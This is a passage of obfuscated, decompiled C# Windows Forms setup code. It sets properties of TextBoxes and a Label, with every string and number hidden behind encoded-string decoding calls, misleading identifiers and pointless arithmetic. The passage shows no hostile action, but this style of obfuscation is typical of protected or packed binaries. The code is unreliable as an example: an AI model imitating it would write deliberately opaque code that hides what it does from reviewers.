		array32[4] = 9025;
		string string_30;
		int num35;
		int num36;
		checked
		{
			array32[array2[6]] = Marshal.SizeOf(typeof(Identification)) - 726044;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_27, array32);
			string text16 = text15 + string_27;
			string string_28 = string.Concat("왗옑", char.ToString('옞') + "옛옒옄왗옟");
			object[] array33 = new object[Marshal.SizeOf(typeof(FloatComparisonMode)) ^ StrongBox__1];
			int num33 = default(int);
			switch (array2[129] + -523671)
			{
			case 0:
				num33 = 0;
				break;
			case 1:
				num33 = -731110;
				break;
			}
			array33[0] = unchecked((byte)num33) != 0;
			array33[1] = 20842;
			array33[2] = Convert.ToInt32("11111111111111010111110110000100", 2) - -174429;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_28, array33);
			string text17 = string_28;
			string text18 = char.ToString(array[23]);
			string string_29 = string.Concat(char.ToString('誥'), char.ToString('誶') + "諳誱誶", char.ToString('誶') + "誽諳" + "誶誽誰誡說誣誧誶誷諽");
			int num34 = ((0 != Convert.ToInt32("0", 8)) ? 793885 : 5);
			object[] array34 = new object[num34];
			array34[0 << Convert.ToInt32("10000", 2)] = false;
			array34[1] = Convert.ToInt32(char.ToString('1') + "110000001", 2);
			array34[array2[0]] = Convert.ToInt32(char.ToString('5') + "5d", 16);
			array34[unchecked((nint)((Array)(object)(char.ToString('\u034b') + "\u036b\u0322")).LongLength)] = invkind * -9;
			array34[Marshal.SizeOf(typeof(IsValidText))] = char.ToString('⚵') + "ǅʒ";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_29, array34);
			string_30 = string.Concat(text16, text17 + text18 + string_29);
			num35 = ((Convert.ToInt32("37777777362", 8) > 586445) ? 310807 : (-487881));
			num36 = Convert.ToInt32("fff88e34", 16);
		}
		char c5 = (char)(num35 - num36);
		object[] array35 = new object[(int)c5];
		int num37 = Convert.ToInt32("37777737776", 8) & -156944;
		int num38 = ((-45863 >= array2[130]) ? Convert.ToInt32("fffd6abf", 16) : (-113744));
		int num39 = checked(num37 + num38) + checked(LoadAlignedVector256 - 26877);
		int num40 = ((Convert.ToInt32(char.ToString('1') + "3590", GCHeapDumpKeyword) >= get_IntervalSec << Convert.ToInt32("1", 8)) ? Convert.ToInt32(char.ToString('9') + char.ToString('1') + "b8b", Marshal.SizeOf(typeof(PrepareDelegate))) : 19);
		array35[num39] = (char)(353 * num40);
		int num41 = array6[array2[131] >> 6] % ((Convert.ToInt32("13354501777", 8) / 22513 == array2[22]) ? (Convert.ToInt32("fff179c5", 16) ^ 0x5F158) : ((Convert.ToInt32("11111111111111110011100111011111", 2) != Convert.ToInt32("fffec402", 16)) ? 2 : 127221));
		char c6 = (char)('ㅒ' | _003CModule_003E.get_PositiveSign[150]);
		array35[num41] = 0x187 | c6;
		string string_31 = "埓";
		object[] array36 = new object[30 % (nint)((Array)(object)"\u0351\u034b\u0354\u0320\u0365\u036e\u0309\u0329\u0352.\u0323\u0301").LongLength];
		array36[0] = (int)array[24];
		int num42 = ((OperatingSystem != Convert.ToInt32("37777777167", 8)) ? Convert.ToInt32("11111111111100100001001101001110", 2) : Marshal.SizeOf(typeof(UseHebrewParsing)));
		array36[num42] = 61;
		array36[sizeof(short)] = Convert.ToInt32("37777777727", 8) * -12;
		checked
		{
			array36[endAction] = 122 * unchecked((int)array[3]);
			int num43 = default(int);
			switch (40078 + array2[132])
			{
			case 0:
				num43 = 4;
				break;
			case 1:
				num43 = array[76];
				break;
			case 2:
				num43 = -793842;
				break;
			}
			array36[num43] = false;
		}
		array36[5] = Convert.ToInt32("fffffff8", 16) * -2;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_31, array36);
		int num44 = Convert.ToInt32(string_31, array4[PrivateScope]);
		int num46 = default(int);
		switch (Convert.ToInt32("11111111111011010101101001011101", 2) + 810289)
		{
		case -411765:
		{
			string string_32 = string.Concat(char.ToString('⇛') + "⇛⇛", char.ToString((char)Convert.ToInt32("10000111011011", 2)), char.ToString('⇛') + "⇚⇚⇛⇛⇛⇚⇚⇛⇛⇚⇚⇚");
			int num47 = ((Convert.ToInt32("ffffc362", 16) != -15518) ? (-980133) : _003CModule_003E.get_PositiveSign[2]);
			object[] array37 = new object[num47];
			int num48 = 0 / Convert.ToInt32("6463232427", 8);
			int num49 = ((Marshal.SizeOf(typeof(CreateReadOnlySpan)) >= -253855) ? ((Array)(object)string.Empty).Length : 210441);
			array37[num48] = (byte)num49 != 0;
			array37[1] = checked(768630 + _003CModule_003E.get_PositiveSign[151]);
			array37[(nint)((Array)(object)"\u032c\u0347").LongLength] = string.Concat("ᓐ\u0017", char.ToString('>') + "+\u0002\u0004");
			char c8 = (char)Convert.ToInt32("6173", 8);
			array37[3] = (int)c8;
			array37[7 & get_ResourceExposureLevel] = char.ToString((char)Convert.ToInt32("2", 16)) + char.ToString('\n') + "\u0002\u0004";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_32, array37);
			num46 = Convert.ToInt32(string_32, 2);
			break;
		}
		case -411764:
			num46 = Convert.ToInt32(char.ToString('2') + char.ToString('8') + "3200b9", 16) | -674191312;
			break;
		case -411763:
		{
			int num50 = Convert.ToInt32("fffe9b50", 16);
			int num51 = ((num50 <= checked(-1451561 + _003CModule_003E.get_PositiveSign[152])) ? Convert.ToInt32(char.ToString('2') + char.ToString('1') + "56657", 8) : Convert.ToInt32(char.ToString('1') + "0110000011001101", 2));
			num46 = num51;
			break;
		}
		case -411762:
		{
			int num45 = default(int);
			switch (checked(unchecked(Convert.ToInt32("11111000111101011011", 2) - 290038) - (290602 + Convert.ToInt32("6b33a", 16))))
			{
			case 0:
			{
				char c7 = (char)Convert.ToInt32("53362", 8);
				num45 = c7;
				break;
			}
			case 1:
				num45 = array[25];
				break;
			case 2:
				num45 = -191480;
				break;
			}
			num46 = num45;
			break;
		}
		}
		array35[num44] = num46;
		_003CModule_003E.GetMaxByteCount(ref string_30, array35);
		((Control)tryRunSingle7).set_Text(string_30);
		TextBox obj2 = get_DaylightDelta;
		int red = Convert.ToInt32("377" + "77777735", Marshal.SizeOf(typeof(__c__DisplayClass0_6))) * (Convert.ToInt32("305ee2df", 16) | Convert.ToInt32("11101111111011010011111100101110", 2));
		int num52 = default(int);
		switch (checked(939581 + Convert.ToInt32("111" + "11" + "111111100011010100111000011", _003CModule_003E.ActivityOptions[0])))
		{
		case 0:
			num52 = 37;
			break;
		case 1:
			num52 = -502942;
			break;
		}
		int green = num52 | array4[(Convert.ToInt32("11111111111111110011101001011010", 2) == -53535) ? (-787013) : 3];
		int num53 = Convert.ToInt32("7", 8) & 6;
		((Control)obj2).set_BackColor(Color.FromArgb(red, green, array4[num53]));
		((TextBoxBase)get_DaylightDelta).set_BorderStyle((BorderStyle)((3018 * ((-52796 > array2[133]) ? Convert.ToInt32("11", 16) : 154677) != 51306) ? ((Convert.ToInt32("27664054324", 8) | -1041651000) & -5129) : 0));
		TextBox obj3 = get_DaylightDelta;
		string text19 = char.ToString((char)((Convert.ToInt32("14631172447", 8) - -454701) / (Marshal.SizeOf(typeof(EVENT_FILTER_DESCRIPTOR)) + -460836)));
		string text20 = char.ToString((char)_003CModule_003E.CalendarType[15]);
		string string_33 = "䡚䡒";
		object[] array38 = new object[Convert.ToInt32("4", 8)];
		array38[Convert.ToInt32("665", 16) >> _003CModule_003E.KeyValuePair__2[96]] = checked(_003CModule_003E.ActivityOptions[134] + 518398);
		array38[(nint)((Array)(object)string.Empty).LongLength | (int)array[3]] = false;
		array38[2] = checked(Convert.ToInt32("ef69e", 16) + -977718);
		array38[(uint)array[5]] = 3925;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_33, array38);
		string text21 = string_33;
		string string_34 = string.Concat(char.ToString('楜'), char.ToString('椙') + "楬楰");
		object[] array39 = new object[Convert.ToInt32("6451", 8) >> 10];
		array39[0] = 4524;
		array39[1] = set_NumberDecimalSeparator;
		array39[2] = (byte)array2[(nint)((Array)(object)"\u032d").LongLength] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_34, array39);
		string string_35 = string.Concat(text19, text20, text21 + string_34);
		object[] array40 = new object[ConfiguredTaskAwaitable__1];
		char c9 = array4[Convert.ToInt32("0", 2) % CollectionCount];
		array40[(uint)c9] = (char)MemoryPressure;
		string string_36 = string.Concat(char.ToString('\ue9fd'), char.ToString('\ue9fb') + "\ue9ff\ue9ff");
		object[] array41 = new object[get_LocalizationResources ^ 0x6FB66];
		array41[0] = (int)array[MaxNumberAcross];
		array41[array2[2]] = (char)Convert.ToInt32(char.ToString('1') + "2061", 8);
		array41[2] = 6496;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_36, array41);
		string value = string_36;
		int fromBase = default(int);
		switch (checked(Convert.ToInt32("0", 2) * Convert.ToInt32("11111111111111100110110101111101", 2)))
		{
		case 0:
			fromBase = Marshal.SizeOf(typeof(__c__DisplayClass0_6));
			break;
		}
		string text22 = char.ToString((char)Convert.ToInt32(value, fromBase));
		string string_37 = "\ue85c\ue837";
		object[] array42 = new object[Convert.ToInt32("3", 8) << 1];
		int num54 = ((((32289 > array2[134]) ? 1 : 0) == Convert.ToInt32("0", 2)) ? 54323 : 0);
		array42[num54] = array2[113] * 124;
		array42[Marshal.SizeOf(typeof(UseHebrewParsing))] = (byte)Convert.ToInt32("0", array[8]) != 0;
		char c10 = (char)Convert.ToInt32("1139", 16);
		array42[2] = (int)c10;
		int num55 = 15 % _003CModule_003E.get_PositiveSign[0];
		int num56 = array[77];
		array42[num55] = (char)num56;
		array42[(nint)((Array)(object)(char.ToString('\u033b') + "\u034a\u0347\u0329")).LongLength] = 444;
		array42[5 * _003CModule_003E.ActivityOptions[2]] = 3961;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_37, array42);
		array40[sizeof(sbyte)] = text22 + string_37;
		string string_38 = "鐲";
		object[] array43 = new object[Marshal.SizeOf(typeof(ENODATA))];
		array43[0] = 15891;
		array43[array2[(uint)array[1]]] = (char)get_Capacity;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_38, array43);
		array40[Convert.ToInt32(string_38, checked(_003CModule_003E.ActivityOptions[Convert.ToInt32("3", 16)] * unchecked(-2 * Convert.ToInt32("ffffffff", 16))))] = ((_003CModule_003E.ActivityOptions[135] * -103) ^ Convert.ToInt32(char.ToString('f') + "ff178ef", Marshal.SizeOf(typeof(PrepareDelegate)))) >> 13;
		array40[3] = 5547;
		_003CModule_003E.GetMaxByteCount(ref string_35, array40);
		((Control)obj3).set_Font(new Font(string_35, 9f, (FontStyle)(SAKA << TSpan), (GraphicsUnit)PreserveBaseOverridesAttribute, (byte)(0 & (nint)((Array)(object)string.Empty).LongLength)));
		((Control)get_DaylightDelta).set_ForeColor(SystemColors.MenuBar);
		TextBox obj4 = get_DaylightDelta;
		string text23 = char.ToString('1');
		string string_39 = "줬줭";
		object[] array44 = new object[3];
		array44[get_LoaderExceptions - -781014] = '婅';
		array44[(uint)array[3]] = 28376;
		array44[2] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_39, array44);
		string text24 = string_39;
		string string_40 = string.Concat(char.ToString('鍻'), char.ToString('鍺') + "鍻鍺鍻鍻");
		object[] array45 = new object[Convert.ToInt32("57567651", 16) / 488428059];
		array45[207799177 >> Convert.ToInt32("1c", 16)] = false;
		array45[Marshal.SizeOf(typeof(OverlappedData)) % Convert.ToInt32("2", 8)] = 17395;
		array45[2] = Marshal.SizeOf(typeof(ShiftRightArithmeticRoundedNarrowingSaturateUnsignedScalar));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_40, array45);
		int x = Convert.ToInt32(text23 + text24 + string_40, sizeof(ushort));
		string string_41 = string.Concat("\ue4c9\ue4cd", char.ToString((char)_003CModule_003E.KeyValuePair__2[149]), char.ToString('\ue4cd') + "\ue4cd\ue4cc\ue4cf\ue4ce\ue4ce\ue4cc\ue4cc");
		object[] array46 = new object[Convert.ToInt32("3", _003CModule_003E.get_PositiveSign[3])];
		array46[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString('匵'), char.ToString('ᎃ') + char.ToString('ൎ') + "\u0011-");
		array46[1] = string.Concat(char.ToString('⍏'), char.ToString('⼎'), char.ToString('\u0c3a') + char.ToString('ߎ') + "ӑր");
		int num57 = ((StateMachineType < -956812) ? array2[135] : 0);
		array46[2] = (byte)num57 != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_41, array46);
		int y;
		if (Convert.ToInt32(string_41, 8) > 281643)
		{
			int num58 = ((((-19281 < checked(1161062 + Convert.ToInt32("11111111111110010101101110110100", 2))) ? 1 : 0) != Convert.ToInt32("0", 2)) ? (-299237) : (Convert.ToInt32("ffffbbef", 16) & -348492));
			y = num58;
		}
		else
		{
			y = 134;
		}
		((Control)obj4).set_Location(new Point(x, y));
		((TextBoxBase)get_DaylightDelta).set_Multiline((byte)_003CModule_003E.Dequeue[(nint)((Array)(object)string.Empty).LongLength] != 0);
		TextBox obj5 = get_DaylightDelta;
		string string_42 = "䫌䫝";
		object[] array47 = new object[array2[136] - array2[137]];
		array47[(uint)array[2]] = Convert.ToInt32(char.ToString('4') + char.ToString('d') + "c1", sizeof(decimal));
		array47[Marshal.SizeOf(typeof(UseHebrewParsing))] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array47[2] = string.Concat(char.ToString('ᮗ'), char.ToString('ٴ'), char.ToString('U') + char.ToString('-') + "ɮ|\u0016");
		array47[Convert.ToInt32("3", 16) * 1] = 190;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_42, array47);
		string text25 = string_42;
		string string_43 = "뢯뢣";
		object[] array48 = new object[4];
		int num59 = _003CModule_003E.ActivityOptions[Convert.ToInt32("1", 8)];
		int num60 = (('\0' != array[2]) ? Json : 5374);
		array48[num59] = num60;
		array48[(nint)((Array)(object)"\u0366").LongLength] = (byte)Convert.ToInt32("0", array2[97]) != 0;
		char c11 = (char)sizeof(char);
		array48[(int)c11] = string.Concat(char.ToString((char)array2[107]), char.ToString('℀'), char.ToString('ĕ') + "Ȏ\u031e\u0002\u0017");
		array48[3] = (char)Convert.ToInt32("1000" + "1011" + "1011110", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_43, array48);
		string text26 = string_43;
		string string_44 = string.Concat(char.ToString('赲'), char.ToString('赟') + "赈贁");
		object[] array49 = new object[Convert.ToInt32("0", 2) | (nint)((Array)(object)".\u0349\u034d\u0347").LongLength];
		array49[0] = (byte)(0 % _003CModule_003E.KeyValuePair__2[150]) != 0;
		array49[1] = _003CModule_003E.KeyValuePair__2[151] + -279775;
		char c12 = (char)Marshal.SizeOf(typeof(Ble_S));
		array49[2] = (int)c12;
		array49[15 % (nint)((Array)(object)"\u0345\u034e\u032e\u030a\u0355\u036c").LongLength] = 29987;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_44, array49);
		string string_45 = string.Concat(text25, text26 + string_44);
		string text27 = char.ToString((char)Convert.ToInt32(char.ToString('1') + char.ToString('1') + "00000101", 2));
		string string_46 = "崷嵂";
		object[] array50 = new object[3139981 >> GetUtf8SequenceLength];
		array50[0] = (char)Convert.ToInt32(char.ToString('2') + char.ToString('c') + "66", ((Array)(object)"\u0355\u0303\u0347\u0362\u0306\u030d\u033d\u0350\u0342.\u0339\u034d\u0333\u0332\u0338\u0347").Length);
		array50[Marshal.SizeOf(typeof(UseHebrewParsing))] = string.Concat(char.ToString('ɦ'), char.ToString('\u09e2') + "Ǔ\u02d3");
		array50[Convert.ToInt32("2", ((Array)(object)"\u0351\u0345\u0354\u0347.\u0331\u0324\u034d").Length)] = Convert.ToInt32(char.ToString('1') + "0225", 8);
		array50[3] = ((Convert.ToInt32("110111101111111", 2) < Convert.ToInt32("fff1f6cd", 16)) ? 655410 : 2175);
		array50[checked(Convert.ToInt32("1001110001111011100", 2) + -320472)] = 2046;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_46, array50);
		object[] array51 = new object[(nint)((Array)(object)(text27 + string_46)).LongLength];
		string string_47 = "≝";
		object[] array52 = new object[5];
		array52[0 * Convert.ToInt32("10110010001011111110", 2)] = 6208;
		array52[Convert.ToInt32("1", Convert.ToInt32("8", 16))] = checked(get_Current - Convert.ToInt32("11100001110010001101", 2));
		array52[(33134 != Marshal.SizeOf(typeof(ResolveUnmanagedDllToPath))) ? 273669 : Convert.ToInt32("2", 8)] = (char)NoneViaConstructor;
		array52[3] = (byte)checked(_003CModule_003E.ActivityOptions[1] * Convert.ToInt32("dd2c0", 16)) != 0;
		array52[(uint)array[6]] = (char)array2[array2[11]];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_47, array52);
		array51[Convert.ToInt32(string_47, _003CModule_003E.KeyValuePair__2[104] & Convert.ToInt32(char.ToString('1') + char.ToString('0') + "10", Convert.ToInt32("2", 8)))] = 2457;
		char c13 = (char)checked(Convert.ToInt32("111" + "11111111111001101101010010100", 2) + 206189);
		array51[(uint)c13] = 148 * checked(-3 * GetDllEntry) * 29;
		string string_48 = "ꅿ";
		object[] array53 = new object[array2[139] ^ -345919];
		array53[0] = (char)Marshal.SizeOf(typeof(AddHours));
		array53[Convert.ToInt32("1", 2)] = _003CModule_003E.KeyValuePair__2[Convert.ToInt32("21", 16)];
		array53[(nint)((Array)(object)string.Empty).LongLength | 2] = Convert.ToInt32("11205440200", 8) / 4315876;
		array53[Marshal.SizeOf(typeof(CharSetMask))] = string.Concat(char.ToString('\u0741'), char.ToString('ę'), char.ToString('n') + char.ToString('\u000e') + "*\r");
		array53[(uint)array[6]] = 2990;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_48, array53);
		string value2 = string_48;
		int num61 = ((73829 >= _003CModule_003E.KeyValuePair__2[152]) ? (-857642) : _003CModule_003E.KeyValuePair__2[153]);
		int fromBase2;
		if (num61 == -12372)
		{
			fromBase2 = checked(Marshal.SizeOf(typeof(__c__DisplayClass0_6)) * 2);
		}
		else
		{
			int num62 = default(int);
			switch (_003CModule_003E.ActivityOptions[136])
			{
			case -150709:
				num62 = Convert.ToInt32("ffff70a8", 16);
				break;
			}
			fromBase2 = num62;
		}
		array51[Convert.ToInt32(value2, fromBase2)] = 719;
		_003CModule_003E.GetMaxByteCount(ref string_45, array51);
		((Control)obj5).set_Name(string_45);
		((TextBoxBase)get_DaylightDelta).set_ReadOnly((byte)Marshal.SizeOf(typeof(IsTvOS)) != 0);
		TextBox obj6 = get_DaylightDelta;
		string string_49 = "置籷";
		object[] array54 = new object[_003CModule_003E.ActivityOptions[3] | sizeof(bool)];
		array54[0] = false;
		array54[Convert.ToInt32("1", 2) & 1] = string.Concat(char.ToString((char)_003CModule_003E.KeyValuePair__2[154]), char.ToString('\u0017') + ";\u0014\u007f");
		array54[2] = Convert.ToInt32(char.ToString('d') + "ef", 16);
		char num63 = array[5];
		char c14 = (char)_003CModule_003E.ActivityOptions[137];
		array54[(uint)num63] = (int)c14;
		array54[4] = string.Concat(char.ToString((char)get_DaylightTransitionStart), char.ToString('ℾ'), char.ToString('\u0487') + "\u009eր");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_49, array54);
		nint num64 = (nint)((Array)(object)string_49).LongLength;
		string string_50 = "鴇";
		object[] array55 = new object[3];
		array55[array[2] & array[2]] = (char)Convert.ToInt32(char.ToString('7') + char.ToString('4') + "500", 8);
		char c15 = (char)((Array)(object)"\u0355").Length;
		array55[(uint)c15] = Convert.ToInt32(char.ToString('2') + char.ToString('1') + "764", Convert.ToInt32("8", 16));
		array55[2] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_50, array55);
		obj6.set_ScrollBars((ScrollBars)(num64 & Convert.ToInt32(string_50, Convert.ToInt32("fffe2cdb", 16) ^ OpCode)));
		TextBox obj7 = get_DaylightDelta;
		int width2 = array6[Convert.ToInt32("24", 8)] ^ (Marshal.SizeOf(typeof(WindowsRuntime)) | 0xC10B3);
		int num65 = checked(Marshal.SizeOf(typeof(Unbox)) + 470710);
		((Control)obj7).set_Size(new Size(width2, -755927 + num65));
		TextBox obj8 = get_DaylightDelta;
		int num66 = -777550 ^ (Marshal.SizeOf(typeof(TimeOfDay)) - 934442);
		char c16 = (char)Convert.ToInt32("1", 16);
		((Control)obj8).set_TabIndex(num66 * c16);
		TextBox obj9 = get_DaylightDelta;
		int[] loadVector = _003CModule_003E.LoadVector128;
		int num67 = array[2];
		((Control)obj9).set_TabStop((byte)loadVector[(uint)array4[num67]] != 0);
		TextBox obj10 = get_DaylightDelta;
		string text28 = char.ToString((char)Marshal.SizeOf(typeof(bytes)));
		string string_51 = char.ToString((char)Convert.ToInt32("1110000101100100", 2)) + "\ue179\ue175";
		char c17 = (char)((Array)(object)"\u035a..\u0356").Length;
		object[] array56 = new object[(int)c17];
		array56[0] = 5906;
		array56[1] = Marshal.SizeOf(typeof(get_SizeBeforeBytes));
		array56[10 % array2[5]] = string.Concat("⟥\u0322", char.ToString('ன') + char.ToString('ÿ') + "«A");
		array56[Convert.ToInt32("11", 2)] = 1591;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_51, array56);
		string text29 = string_51;
		string string_52 = "訿訒";
		object[] array57 = new object[array2[140] + 717199];
		array57[(int)array[79] >> 11] = 3132;
		array57[1] = char.ToString('Ս') + "ݮҴ";
		array57[2] = false;
		array57[3] = 5441;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_52, array57);
		string text30 = string_52;
		string string_53 = string.Concat(char.ToString('\uf623'), char.ToString('\uf66a') + "\uf675\uf60f\uf63e\uf623\uf62f");
		object[] array58 = new object[checked(296599 - Marshal.SizeOf(typeof(set_UnmanagedCode)))];
		array58[array2[Convert.ToInt32("1", 2)]] = (char)((64865 > _003CModule_003E.get_PositiveSign[153]) ? '\u0ad5' : 4294543414u);
		array58[Convert.ToInt32("1", 16)] = Convert.ToInt32("5505015135", 8) / 69917;
		array58[sizeof(short)] = (char)(1234 << array2[2]);
		array58[3] = '\u0ab4';
		int num68 = default(int);
		checked
		{
			switch (unchecked((nint)((Array)(object)string.Empty).LongLength) * 660088)
			{
			case 0:
				num68 = 4;
				break;
			}
		}
		array58[num68] = (byte)array2[Marshal.SizeOf(typeof(UseHebrewParsing))] != 0;
		array58[25 % Convert.ToInt32("12", 8)] = UnauthenticatedPrincipal;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_53, array58);
		string string_54 = string.Concat(text28, text29 + text30 + string_53);
		string string_55 = string.Concat(char.ToString('勬'), char.ToString((char)Convert.ToInt32("101001011101111", 2)), char.ToString('劾') + "劵劸");
		object[] obj11 = new object[3] { 10842, null, null };
		int num69 = ((Marshal.SizeOf(typeof(set_Description)) <= 943150) ? Convert.ToInt32("1", 16) : (-452296));
		obj11[num69] = array2[23];
		obj11[Convert.ToInt32("1", 16) << 1] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_55, obj11);
		int num70 = Convert.ToInt32(string_55, array2[141] >> 12);
		int reason = Reason;
		object[] array59 = new object[num70 ^ ~reason];
		int num71 = array2[1];
		array59[(1 & num71) % -284801] = _003CModule_003E.ActivityOptions[28] % -153882 - get_ShortTimePattern;
		int num72 = default(int);
		if (((30312 < TryFormatUInt64) ? 1 : 0) != _003CModule_003E.ActivityOptions[1])
		{
			num72 = array2[2];
		}
		char c18 = (char)num72;
		int num73 = c18;
		int num74 = default(int);
		switch (checked(0 * array2[24]))
		{
		case 0:
			num74 = array2[1];
			break;
		case 1:
			num74 = array2[array2[101]];
			break;
		}
		array59[num73] = (byte)checked(num74 * (AddRef - unchecked(array2[143] * 754))) != 0;
		string string_56 = "벧벦";
		object[] array60 = new object[get_ResourceExposureLevel];
		array60[0] = Convert.ToInt32("10101" + "11101111010", 2);
		array60[1] = string.Concat(char.ToString('\u008d'), char.ToString('Щ'), char.ToString('\u001c') + "&\u0017");
		array60[Marshal.SizeOf(typeof(ENODATA))] = (byte)checked(Convert.ToInt32("fff63230", 16) + 642512) != 0;
		array60[GetLogicalDrives + 22817] = char.ToString('\u0315') + char.ToString('Í') + "Żʰ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_56, array60);
		char c19 = (char)Convert.ToInt32(string_56, Marshal.SizeOf(typeof(ENODATA)));
		int num75 = c19;
		string text31 = char.ToString((char)('㥟' & (array2[144] - 905713)));
		int num76 = Convert.ToInt32("37777216402", 8) + 581125;
		int num77 = ((0 != Convert.ToInt32("0", 16)) ? array2[145] : (-380319));
		string text32 = char.ToString((char)checked(num76 + num77));
		string text33 = char.ToString('ዟ');
		string string_57 = "쫫쾓";
		object[] array61 = new object[Stream];
		array61[(uint)array[2]] = 51928;
		int num78 = default(int);
		switch (0 / Convert.ToInt32("37777776303", 8))
		{
		case 0:
			num78 = 1;
			break;
		case 1:
			num78 = 295119;
			break;
		}
		array61[num78] = 'û';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_57, array61);
		array59[num75] = string.Concat(text31, text32, text33 + string_57);
		string string_58 = string.Concat(char.ToString('阵') + "阵阵阵阵阵阵", "阵阵阵" + "阵阵" + "阴阵阵阵阴阵阵阴阵阴阴阴阴阵阴阵阴阵阴阴");
		object[] array62 = new object[Marshal.SizeOf(typeof(OverlappedData))];
		array62[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString('\u0488'), char.ToString('ᙠ'), char.ToString('ȸ') + "§ƒJL");
		array62[Convert.ToInt32("1", array[1])] = 'ㄏ';
		char c20 = (char)Convert.ToInt32("10", 2);
		array62[(uint)c20] = string.Concat(char.ToString((char)SEP_LocalTimeMark), char.ToString('ʩ') + char.ToString('\f') + "\n\b\u0003");
		array62[3] = 15935;
		array62[4] = 264;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_58, array62);
		int num79 = Convert.ToInt32(string_58, Marshal.SizeOf(typeof(ENODATA))) ^ (PersistedFiles | Convert.ToInt32(char.ToString('2') + char.ToString('7') + "371644125", 8));
		string string_59 = string.Concat(char.ToString('橅') + "橄橄橄橄", "橄橅" + "橅橄橅橄橄橄橄");
		object[] array63 = new object[3];
		array63[0] = char.ToString((char)DateStart) + char.ToString((char)Convert.ToInt32("63", 8)) + "ኘ\r";
		array63[1] = array2[146] % Convert.ToInt32("14466", 8);
		array63[array2[147] + -160026] = 2291;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_59, array63);
		string text34 = char.ToString((char)Convert.ToInt32(string_59, 2));
		string text35 = char.ToString((char)(210498 - Convert.ToInt32("110011010010111000", 2)));
		string text36 = char.ToString((char)array2[26]);
		string string_60 = "띦띷";
		object[] array64 = new object[Convert.ToInt32("2", 16)];
		array64[0] = 30604;
		array64[Marshal.SizeOf(typeof(UseHebrewParsing))] = (char)Marshal.SizeOf(typeof(NotInProgress));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_60, array64);
		array59[num79] = string.Concat(text34, text35 + text36 + string_60);
		_003CModule_003E.GetMaxByteCount(ref string_54, array59);
		((Control)obj10).set_Text(componentResourceManager.GetString(string_54));
		((Control)SetSize).set_AutoSize((byte)checked(unchecked(-2819345 % Convert.ToInt32(char.ToString('1') + "1111111111011101100101011000110", 2)) + (_003CModule_003E.KeyValuePair__2[34] >> _003CModule_003E.KeyValuePair__2[107] * -1)) != 0);
		Label setSize = SetSize;
		string text37 = char.ToString('岷');
		string text38 = char.ToString('岁');
		string text39 = char.ToString('岃');
		string string_61 = string.Concat(char.ToString('呁'), char.ToString('呋'), char.ToString('后') + "呻呧");
		object[] array65 = new object[3];
		array65[0] = 1829;
		array65[(nint)((Array)(object)"\u0306").LongLength] = 316;
		array65[_003CModule_003E.ActivityOptions[0]] = string.Concat(char.ToString('I'), char.ToString('\u001d') + "\u0001\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_61, array65);
		string string_62 = string.Concat(text37, text38, text39 + string_61);
		int num80 = ((94628 < Marshal.SizeOf(typeof(U1))) ? 873432 : 27787);
		object[] array66 = new object[checked(num80 - 873429) & (Convert.ToInt32("37776102370", 8) ^ -448596 ^ (0x8115 | Convert.ToInt32("11010001001010010", 2)))];
		int num81 = 0x62181 ^ (2008965 % Convert.ToInt32("1100010" + "0001100000010", Marshal.SizeOf(typeof(ENODATA))));
		string string_63 = "넞";
		object[] array67 = new object[3];
		array67[Convert.ToInt32("0", 2)] = '\u2d97';
		array67[1] = (char)get_TotalAvailableMemoryBytes;
		array67[885801 - DefaultValueAttribute] = (byte)Convert.ToInt32("0", 8) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_63, array67);
		array66[num81] = 5935 << Convert.ToInt32(string_63, Convert.ToInt32("8", Convert.ToInt32("20", 8)));
		int hasFlagsAttribute = HasFlagsAttribute;
		int num82 = default(int);
		switch (checked(Convert.ToInt32("6eb6bbba", 16) + 843784) / Convert.ToInt32(char.ToString('6') + char.ToString('e') + "c39bc2", 16))
		{
		case 0:
			num82 = Convert.ToInt32("10110" + "011001000001010", 2);
			break;
		case 1:
			num82 = IsNotSerialized;
			break;
		case 2:
			num82 = Convert.ToInt32(char.ToString('6') + char.ToString('1') + "17c", Convert.ToInt32("20", 8));
			break;
		}
		int num83 = num82;
		string string_64 = string.Concat(char.ToString('ᓰ') + "ᓴᓴ", char.ToString('ᓴ') + "ᓴᓶᓶᓲᓶᓵᓶ");
		object[] array68 = new object[Marshal.SizeOf(typeof(OverlappedData))];
		array68[Convert.ToInt32("0", 8)] = char.ToString('ڲ') + "Ė\u0c4c";
		array68[checked(992559 + _003CModule_003E.get_PositiveSign[155])] = false;
		int num84 = _003CModule_003E.ActivityOptions[0];
		char c21 = (char)Convert.ToInt32("3", 16);
		array68[num84] = (int)c21;
